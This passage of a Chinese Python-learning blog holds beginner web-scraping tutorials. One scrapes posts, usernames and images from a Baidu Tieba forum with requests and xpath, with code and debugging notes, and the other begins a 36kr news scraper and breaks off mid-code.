    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把百度贴吧【李毅吧】的内容爬取到本地并保存，需要提取用户名称、发表时间、评论数这几个字段，并且把用户头像和发表的图片保存到本地。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><ul>
<li>获取url</li>
<li>发送请求，获取响应</li>
<li>提取数据</li>
<li>保存数据</li>
</ul>
<h3 id="获取url"><a href="#获取url" class="headerlink" title="获取url"></a>获取url</h3><p>观察可知，目标数据所在的url。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb54uu0quxj31f60u00y6.jpg" alt="image.png"><br>页码数和url的规律是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第0页：https://tieba.baidu.com/mo/q/m?word=%E6%9D%8E%E6%AF%85&amp;page_from_search=index&amp;tn6=bdISP&amp;tn4=bdKSW&amp;tn7=bdPSB&amp;lm=16842752&amp;lp=6093&amp;sub4=%E8%BF%9B%E5%90%A7&amp;pn=0&amp;</span><br><span class="line">第1页：https://tieba.baidu.com/mo/q/m?word=%E6%9D%8E%E6%AF%85&amp;page_from_search=index&amp;tn6=bdISP&amp;tn4=bdKSW&amp;tn7=bdPSB&amp;lm=16842752&amp;lp=6093&amp;sub4=%E8%BF%9B%E5%90%A7&amp;pn=30&amp;</span><br><span class="line">第2页：https://tieba.baidu.com/mo/q/m?word=%E6%9D%8E%E6%AF%85&amp;page_from_search=index&amp;tn6=bdISP&amp;tn4=bdKSW&amp;tn7=bdPSB&amp;lm=16842752&amp;lp=6093&amp;sub4=%E8%BF%9B%E5%90%A7&amp;pn=60&amp;</span><br><span class="line">……</span><br><span class="line">第i页：https://tieba.baidu.com/mo/q/m?word=%E6%9D%8E%E6%AF%85&amp;page_from_search=index&amp;tn6=bdISP&amp;tn4=bdKSW&amp;tn7=bdPSB&amp;lm=16842752&amp;lp=6093&amp;sub4=%E8%BF%9B%E5%90%A7&amp;pn=&#123;30i&#125;&amp;</span><br></pre></td></tr></table></figure>
<p>看到总共是510699页。页码范围（1~510699）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb5582i4qdj31f60u0446.jpg" alt="image.png"></p>
<h3 id="发送请求，获取响应"><a href="#发送请求，获取响应" class="headerlink" title="发送请求，获取响应"></a>发送请求，获取响应</h3><p>遍历url列表，使用requests库发送请求。</p>
<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>方法：观察可知，每个用户发表的信息都在相同属性的li标签。这种情况，提取数据最简单的方式就是xpath。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 获取分组的element对象（这里就是对提取的li标签内容做etree）</span><br><span class="line">2. 对element对象做xpath，分别提取各个字段的值</span><br><span class="line">3.（用户名称、发表时间、评论数这三个值可以直接用xpath提取出来，要获取到用户头像和发表的图片，必须先提取到图片对应的url地址之后，再发送请求，获取图片内容）</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb55e3a9wwj31f60u0af4.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb55lkb3qej31f60u043v.jpg" alt="image.png"></p>
<ul>
<li>用户名称</li>
<li>发表时间</li>
<li>评论数</li>
<li>用户头像</li>
<li>发表的图片</li>
</ul>
<h4 id="用户名称"><a href="#用户名称" class="headerlink" title="用户名称"></a>用户名称</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb560k965vj31f60u0n2c.jpg" alt="image.png"></p>
<h4 id="发表时间"><a href="#发表时间" class="headerlink" title="发表时间"></a>发表时间</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb561whg6oj31f60u0dkz.jpg" alt="image.png"></p>
<h4 id="评论数"><a href="#评论数" class="headerlink" title="评论数"></a>评论数</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb563onrmrj31f60u043c.jpg" alt="image.png"></p>
<h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb55rzbip3j31f60u0n2a.jpg" alt="image.png"></p>
<h4 id="发表的图片"><a href="#发表的图片" class="headerlink" title="发表的图片"></a>发表的图片</h4><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb56l57zxdj31f60u0gtg.jpg" alt="image.png"></p>
<h3 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h3><p>f.write保存到本地。注意，保存写入图片的时候，参数要加上b，只能以二进制方式写入，写入内容是bytes类型的<code>response.content</code></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>太不容易了———这个代码写了至少3个小时—–获取段子的内容并不难，主要是对获取到的url地址再次发起请求，获取响应。在写入图片的时候没有使用bytes类型，花费了很多时间排查这个错误——</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tieba</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url_temp = <span class="string">&quot;https://tieba.baidu.com/mo/q/m?word=%E6%9D%8E%E6%AF%85&amp;page_from_search=index&amp;tn6=bdISP&amp;tn4=bdKSW&amp;tn7=bdPSB&amp;lm=16842752&amp;lp=6093&amp;sub4=%E8%BF%9B%E5%90%A7&amp;pn=&#123;&#125;&amp;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span>(<span class="params">self</span>):</span> <span class="comment">#获取url</span></span><br><span class="line">        url_list =  [self.url_temp.<span class="built_in">format</span>(i*<span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># pprint(url_list)</span></span><br><span class="line">        <span class="keyword">return</span> url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url</span>):</span> <span class="comment">#发送请求，获取响应</span></span><br><span class="line">        html_str = requests.get(url,headers=self.headers)</span><br><span class="line">        <span class="comment"># print(html_str.status_code)</span></span><br><span class="line">        html_str = html_str.content.decode()</span><br><span class="line">        <span class="keyword">return</span> html_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content_list</span>(<span class="params">self,html_str</span>):</span></span><br><span class="line">        html_str = etree.HTML(html_str) <span class="comment">#&lt;li&gt;标签分组</span></span><br><span class="line">        <span class="comment"># pprint(html_str)</span></span><br><span class="line">        grp_str_list = html_str.xpath(<span class="string">&quot;//li[@class=&#x27;tl_shadow tl_shadow_new &#x27;]&quot;</span>)</span><br><span class="line">        <span class="comment"># pprint(grp_str_list)</span></span><br><span class="line">        content_list = []    </span><br><span class="line">        <span class="keyword">for</span> grp_str <span class="keyword">in</span> grp_str_list:    </span><br><span class="line">            item = &#123;&#125;        </span><br><span class="line">            item[<span class="string">&quot;user_name&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//span[contains(@class,&#x27;ti_author&#x27;)]/text()&quot;</span>)[<span class="number">0</span>] <span class="comment">#contains用法，定位sapn属性值包含ti_author的span标签</span></span><br><span class="line">            item[<span class="string">&quot;time&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//span[@class=&#x27;ti_time&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&quot;comments&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//span[@class=&#x27;btn_icon&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&quot;content&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;ti_title&#x27;]/span/text()&quot;</span>)</span><br><span class="line">            item[<span class="string">&quot;icon_url&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;ti_avatar&#x27;]/img/@src&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&quot;photo_url&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;medias_wrap ordinary_thread clearfix&#x27;]//img/@data-url&quot;</span>)[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;medias_wrap ordinary_thread clearfix&#x27;]//img/@data-url&quot;</span>))&gt;<span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span> <span class="comment">#重点：判断xpath是否提取到数据，如果没有提取到，就将值设置为None</span></span><br><span class="line">            <span class="comment"># pprint(item[&quot;photo_url&quot;])</span></span><br><span class="line">            content_list.append(item)</span><br><span class="line">        <span class="comment"># pprint(content_list)</span></span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_content_list</span>(<span class="params">self,content_list,page_num</span>):</span> <span class="comment">#保存段子内容</span></span><br><span class="line">        file_path = <span class="string">&quot;第&#123;&#125;页.json&quot;</span>.<span class="built_in">format</span>(page_num)</span><br><span class="line">        <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(json.dumps(content,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>))          </span><br><span class="line">            <span class="comment"># print(file_path)</span></span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_icon</span>(<span class="params">self,icon_byt,page_num</span>):</span> <span class="comment">#保存icon图片</span></span><br><span class="line">        file_path = <span class="string">&quot;icon第&#123;&#125;张.jpg&quot;</span>.<span class="built_in">format</span>(page_num)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(icon_byt)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_photo</span>(<span class="params">self,photo_byt,page_num</span>):</span> <span class="comment">#保存发表图片</span></span><br><span class="line">        file_path = <span class="string">&quot;photo第&#123;&#125;张.jpg&quot;</span>.<span class="built_in">format</span>(page_num)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(photo_byt)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_photo_url</span>(<span class="params">self,url</span>):</span> <span class="comment">#获取图片url的响应，返回bytes类型的结果</span></span><br><span class="line">        photo_str = requests.get(url,headers=self.headers)</span><br><span class="line">        photo_str = photo_str.content</span><br><span class="line">        <span class="keyword">return</span> photo_str</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主逻辑</span></span><br><span class="line">        <span class="comment">#1. 获取url</span></span><br><span class="line">        url_list = self.get_url_list()</span><br><span class="line">        icon_url_list = []</span><br><span class="line">        photo_url_list = []</span><br><span class="line">        <span class="comment">#2. 遍历url列表 </span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:           </span><br><span class="line">            <span class="comment">#3. 发送请求，获取响应</span></span><br><span class="line">            html_str = self.parse_url(url)</span><br><span class="line">            <span class="comment">#3. 提取数据</span></span><br><span class="line">            content_list = self.get_content_list(html_str)</span><br><span class="line">            page_num = url_list.index(url)+<span class="number">1</span> <span class="comment">#页码数和url列表元素的下标之间的关系</span></span><br><span class="line">            <span class="comment">#4. 保存内容数据</span></span><br><span class="line">            self.save_content_list(content_list,page_num)</span><br><span class="line">            <span class="comment">#5. 发送图片请求，获取响应</span></span><br><span class="line">            <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">                i = <span class="number">1</span> <span class="comment">#用于计数，表示这个for循环的循环次数</span></span><br><span class="line">                icon_url_list = [] <span class="comment">#初始化icon图片url列表</span></span><br><span class="line">                photo_url_list = [] <span class="comment">#初始化发表图片url列表</span></span><br><span class="line">                icon_num = content_list.index(content)</span><br><span class="line">                icon_url_list.append(content_list[icon_num][<span class="string">&quot;icon_url&quot;</span>]) <span class="comment">#获取头像图片</span></span><br><span class="line">                <span class="comment"># pprint(icon_url_list)  </span></span><br><span class="line">                icon_byt = self.parse_photo_url(icon_url_list[<span class="number">0</span>]) <span class="comment">#发送请求，获取数据</span></span><br><span class="line">                photo_num = page_num*i+icon_num <span class="comment">#用于表示图片的序号，这个值和for循环的循环次数有数学关系</span></span><br><span class="line">                self.save_icon(icon_byt,photo_num) <span class="comment">#保存icon图片</span></span><br><span class="line">                <span class="keyword">while</span> content_list[icon_num][<span class="string">&quot;photo_url&quot;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="comment">#当图片url地址不为None时，才对url地址发送请求 </span></span><br><span class="line">                    photo_url_list.append(content_list[icon_num][<span class="string">&quot;photo_url&quot;</span>]) <span class="comment">#获取发表图片               </span></span><br><span class="line">                    photo_byt = self.parse_photo_url(photo_url_list[<span class="number">0</span>]) <span class="comment">#发送请求，获取数据</span></span><br><span class="line">                    <span class="comment"># photo_num = page_num*icon_num+icon_num</span></span><br><span class="line">                    self.save_photo(photo_byt,photo_num) <span class="comment">#保存发表图片</span></span><br><span class="line">                    <span class="comment"># pprint(photo_url_list[0])    </span></span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment">#这里必须加上break，否则程序要卡死</span></span><br><span class="line">                i = i +<span class="number">1</span>               </span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_tieba = tieba()</span><br><span class="line">    my_tieba.run()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要还是对数据类型不熟悉。这个练习，涉及了对列表和字典的操作。<br>怎么构造字典，怎么构造列表。这里都用了<code>append</code>的方式将新增的数据添加到空列表。在使用之前，必须记得初始化列表。其中有个错误，就是因为没有初始化列表photo_url_list，也是花了很多时间才找到原因。目标数据的字段多于两个，就可以把数据构造成字典，append到空列表中存储。<br>写入图片，直接使用<code>response.content</code>这种bytes类型的数据，不能再decode。<br>第一次使用while。while就是永远循环，直到条件不成立，就结束循环，这个代码要搭配break，否则程序卡死动不了。<br>用xpath提取数据，不要忘记考虑这个点，有些分组可能提取不到某些字段，这个时候，就要把相应字段的值设置为<code>None</code>，保持字典的完整性。<br><code>item[&quot;photo_url&quot;] = grp_str.xpath(&quot;.//div[@class=&#39;medias_wrap ordinary_thread clearfix&#39;]//img/@data-url&quot;)[0] if len(grp_str.xpath(&quot;.//div[@class=&#39;medias_wrap ordinary_thread clearfix&#39;]//img/@data-url&quot;))&gt;0 else None</code>这个叫做三元表达式。和列表推导式很类似，就是先看条件，条件满足，就赋值给左边，否则赋值到右边。<br>然后就是对于代码里面设置的循环次数这类数学问题，很生疏。虽然日常生活中的加减乘除都没有大问题，代码里面的数学问题，就算只有小学数学的难度，也要把人搞昏……真的挺不喜欢i这个变量。在学校里面学c语言的时候，就是从i的各种加减乘除开始的，什么i++，++i，整得头痛，编程的兴趣就是这么耗尽的，用代码解决纯数学问题太太太枯燥了。<br>还有一个点需要特别注意，在浏览器使用xpath helper的时候，要注意检查响应的内容和页面的element内容有没有差别。今天就被坑了……element里面的代码和url的响应内容有些些差别，这一点细微的差别，导致的结果就是xpath提取不到数据。所以，用xpath helper工具虽然方便，还是要多留心，最好是以响应数据为准，做xpath的时候优先看响应数据。</p>
<h2 id="更正"><a href="#更正" class="headerlink" title="更正"></a>更正</h2><p>代码的计数方式不对。改为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tieba</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url_temp = <span class="string">&quot;https://tieba.baidu.com/mo/q/m?word=%E6%9D%8E%E6%AF%85&amp;page_from_search=index&amp;tn6=bdISP&amp;tn4=bdKSW&amp;tn7=bdPSB&amp;lm=16842752&amp;lp=6093&amp;sub4=%E8%BF%9B%E5%90%A7&amp;pn=&#123;&#125;&amp;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span>(<span class="params">self</span>):</span> <span class="comment">#获取url</span></span><br><span class="line">        url_list =  [self.url_temp.<span class="built_in">format</span>(i*<span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># pprint(url_list)</span></span><br><span class="line">        <span class="keyword">return</span> url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url</span>):</span> <span class="comment">#发送请求，获取响应</span></span><br><span class="line">        html_str = requests.get(url,headers=self.headers)</span><br><span class="line">        <span class="comment"># print(html_str.status_code)</span></span><br><span class="line">        html_str = html_str.content.decode()</span><br><span class="line">        <span class="keyword">return</span> html_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content_list</span>(<span class="params">self,html_str</span>):</span></span><br><span class="line">        html_str = etree.HTML(html_str) <span class="comment">#&lt;li&gt;标签分组</span></span><br><span class="line">        <span class="comment"># pprint(html_str)</span></span><br><span class="line">        grp_str_list = html_str.xpath(<span class="string">&quot;//li[@class=&#x27;tl_shadow tl_shadow_new &#x27;]&quot;</span>)</span><br><span class="line">        <span class="comment"># pprint(grp_str_list)</span></span><br><span class="line">        content_list = []    </span><br><span class="line">        <span class="keyword">for</span> grp_str <span class="keyword">in</span> grp_str_list:    </span><br><span class="line">            item = &#123;&#125;        </span><br><span class="line">            item[<span class="string">&quot;user_name&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//span[contains(@class,&#x27;ti_author&#x27;)]/text()&quot;</span>)[<span class="number">0</span>] <span class="comment">#contains用法，定位sapn属性值包含ti_author的span标签</span></span><br><span class="line">            item[<span class="string">&quot;time&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//span[@class=&#x27;ti_time&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&quot;comments&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//span[@class=&#x27;btn_icon&#x27;]/text()&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&quot;content&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;ti_title&#x27;]/span/text()&quot;</span>)</span><br><span class="line">            item[<span class="string">&quot;icon_url&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;ti_avatar&#x27;]/img/@src&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            item[<span class="string">&quot;photo_url&quot;</span>] = grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;medias_wrap ordinary_thread clearfix&#x27;]//img/@data-url&quot;</span>)[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(grp_str.xpath(<span class="string">&quot;.//div[@class=&#x27;medias_wrap ordinary_thread clearfix&#x27;]//img/@data-url&quot;</span>))&gt;<span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            <span class="comment"># pprint(item[&quot;photo_url&quot;])</span></span><br><span class="line">            content_list.append(item)</span><br><span class="line">        <span class="comment"># pprint(content_list)</span></span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_content_list</span>(<span class="params">self,content_list,page_num</span>):</span></span><br><span class="line">        file_path = <span class="string">&quot;第&#123;&#125;页.json&quot;</span>.<span class="built_in">format</span>(page_num)</span><br><span class="line">        <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(json.dumps(content,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>))          </span><br><span class="line">            <span class="comment"># print(file_path)</span></span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_icon</span>(<span class="params">self,icon_byt,page_num</span>):</span> <span class="comment">#保存icon图片</span></span><br><span class="line">        file_path = <span class="string">&quot;icon第&#123;&#125;张.jpg&quot;</span>.<span class="built_in">format</span>(page_num)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(icon_byt)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_photo</span>(<span class="params">self,photo_byt,page_num</span>):</span> <span class="comment">#保存发表图片</span></span><br><span class="line">        file_path = <span class="string">&quot;photo第&#123;&#125;张.jpg&quot;</span>.<span class="built_in">format</span>(page_num)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(photo_byt)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_photo_url</span>(<span class="params">self,url</span>):</span> <span class="comment">#获取图片url的响应，返回bytes类型的结果</span></span><br><span class="line">        photo_str = requests.get(url,headers=self.headers)</span><br><span class="line">        photo_str = photo_str.content</span><br><span class="line">        <span class="keyword">return</span> photo_str</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主逻辑</span></span><br><span class="line">        <span class="comment">#1. 获取url</span></span><br><span class="line">        url_list = self.get_url_list()</span><br><span class="line">        icon_url_list = []</span><br><span class="line">        photo_url_list = []</span><br><span class="line">        <span class="comment">#2. 遍历url列表 </span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:           </span><br><span class="line">            <span class="comment">#3. 发送请求，获取响应</span></span><br><span class="line">            html_str = self.parse_url(url)</span><br><span class="line">            <span class="comment">#3. 提取数据</span></span><br><span class="line">            content_list = self.get_content_list(html_str)</span><br><span class="line">            page_num = url_list.index(url)+<span class="number">1</span> <span class="comment">#页码数和url列表元素的下标之间的关系</span></span><br><span class="line">            <span class="comment">#4. 保存内容数据</span></span><br><span class="line">            self.save_content_list(content_list,page_num)</span><br><span class="line">            <span class="comment">#5. 发送图片请求，获取响应</span></span><br><span class="line">            <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">                content_num = content_list.index(content)</span><br><span class="line">                icon_url_list.append(content_list[content_num][<span class="string">&quot;icon_url&quot;</span>]) <span class="comment">#获取头像图片</span></span><br><span class="line">                <span class="comment"># pprint(icon_url_list)  </span></span><br><span class="line">                icon_num = <span class="built_in">len</span>(icon_url_list)</span><br><span class="line">                icon_byt = self.parse_photo_url(icon_url_list[icon_num-<span class="number">1</span>]) <span class="comment">#发送请求，获取数据</span></span><br><span class="line">                self.save_icon(icon_byt,icon_num) <span class="comment">#保存icon图片</span></span><br><span class="line">                <span class="keyword">while</span> content_list[content_num][<span class="string">&quot;photo_url&quot;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="comment">#当图片url地址不为None时，才对url地址发送请求 </span></span><br><span class="line">                    photo_url_list.append(content_list[content_num][<span class="string">&quot;photo_url&quot;</span>]) <span class="comment">#获取发表图片 </span></span><br><span class="line">                    photo_num = <span class="built_in">len</span>(photo_url_list)              </span><br><span class="line">                    photo_byt = self.parse_photo_url(photo_url_list[photo_num-<span class="number">1</span>]) <span class="comment">#发送请求，获取数据</span></span><br><span class="line">                    self.save_photo(photo_byt,photo_num) <span class="comment">#保存发表图片  </span></span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment">#这里必须加上break，否则程序要卡死         </span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_tieba = tieba()</span><br><span class="line">    my_tieba.run()</span><br></pre></td></tr></table></figure>
<h2 id="灵感来源"><a href="#灵感来源" class="headerlink" title="灵感来源"></a><a href="https://dana5haw.com/2020/01/22/python爬虫实例之爬取糗事百科段子/">灵感来源</a></h2><p>好像每一次的疑问，都一定能找到答案。真的很巧。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>爬取贴吧页面</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之爬取36kr的新闻</title>
    <url>//posts/ZH-CN/Python_Spider_36kr.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把36kr的新闻爬取到本地并保存为json格式。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><ul>
<li>获取url</li>
<li>发送请求，获取响应</li>
<li>提取数据</li>
<li>保存数据</li>
</ul>
<h3 id="获取url"><a href="#获取url" class="headerlink" title="获取url"></a>获取url</h3><p>观察可知，目标数据所在url。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4hjywob2j31f60u0tga.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4hlmnzc9j31f60u0n4t.jpg" alt="image.png"></p>
<h3 id="发送请求，获取响应"><a href="#发送请求，获取响应" class="headerlink" title="发送请求，获取响应"></a>发送请求，获取响应</h3><p>最基本的，用requests库发送请求即可。</p>
<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>这里需要注意，使用正则提取目标数据之后，这个目标数据格式并不是标准的json格式，我们得调整一下（用<code>re.sub</code>方法去除多余的字符串），把它改成标准格式。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4ho9ao5lj31f60u0463.jpg" alt="image.png"></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">kr</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url = <span class="string">&quot;https://36kr.com/&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self,url,headers</span>):</span></span><br><span class="line">        response = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">self,html_str</span>):</span></span><br><span class="line">        json_str = re.findall(<span class="string">&quot;&lt;script&gt;(.+?)&lt;/script&gt;&quot;</span>,html_str,re.S)[<span class="number">0</span>] <span class="comment">#这里注意，正则之后返回的数据类型是列表，要转换成str类型继续使用正则</span></span><br><span class="line">        json_str =re.sub(<span class="string">&quot;window.initialState=&quot;</span>,<span class="string">&quot;&quot;</span>,json_str) <span class="comment">#这个正则就是在去除多余的字符串</span></span><br><span class="line">        <span class="comment"># print(json_str)</span></span><br><span class="line">        json_str = json.loads(json_str) <span class="comment">#读取json数据</span></span><br><span class="line">        <span class="keyword">return</span> json_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_content</span>(<span 